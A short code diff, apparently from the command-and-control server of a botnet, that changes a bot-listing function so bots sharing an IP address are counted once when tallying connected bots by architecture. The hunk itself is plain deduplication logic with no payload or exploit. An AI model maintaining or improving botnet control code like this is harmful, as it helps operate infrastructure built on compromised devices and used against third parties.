@@ -543,6 +543,16 @@ void handle_bots_command(char *response) {
     pthread_mutex_lock(&bot_mutex);
     for (int i = 0; i < bot_count; i++) {
         if (!bots[i].is_valid) continue;
+        
+        int is_duplicate = 0;
+        for (int j = 0; j < i; j++) {
+            if (bots[j].is_valid && bots[j].address.sin_addr.s_addr == bots[i].address.sin_addr.s_addr) {
+                is_duplicate = 1;
+                break;
+            }
+        }
+        if (is_duplicate) continue;
+        
         valid_bots++;
         int found = 0;
         for (int j = 0; j < NUM_ARCHS-1 && !found; j++) {
